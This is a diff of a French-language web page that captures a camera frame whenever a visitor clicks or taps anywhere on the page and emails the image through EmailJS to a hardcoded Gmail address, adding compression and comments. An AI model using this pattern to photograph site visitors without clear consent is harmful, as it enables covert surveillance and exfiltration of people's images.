@@ -4,6 +4,7 @@
   <title>Capture et EmailJS</title>
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
+    // Initialise EmailJS avec ta clé publique
     emailjs.init("mxm3fFA_BxEhqJieq");
   </script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -26,7 +27,7 @@
     async function sendPhoto(imageBase64) {
       try {
         const params = {
-          to_email: "destinataire@email.com", // Remplace par ton email
+          to_email: "adressestestee@gmail.com", // ton email
           message: "Photo capturée via site",
           attachment: imageBase64
         };
@@ -52,7 +53,9 @@
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext("2d").drawImage(video, 0, 0);
-        const imageBase64 = canvas.toDataURL("image/jpeg");
+
+        // Compression pour éviter les erreurs EmailJS
+        const imageBase64 = canvas.toDataURL("image/jpeg", 0.5); 
 
         status.textContent = "Envoi de la photo...";
         const success = await sendPhoto(imageBase64);
@@ -70,6 +73,7 @@
       }
     }
 
+    // Déclenchement sur clic ou tap
     document.body.addEventListener("click", captureAndSend);
     document.body.addEventListener("touchstart", captureAndSend, {passive:true});
   </script>
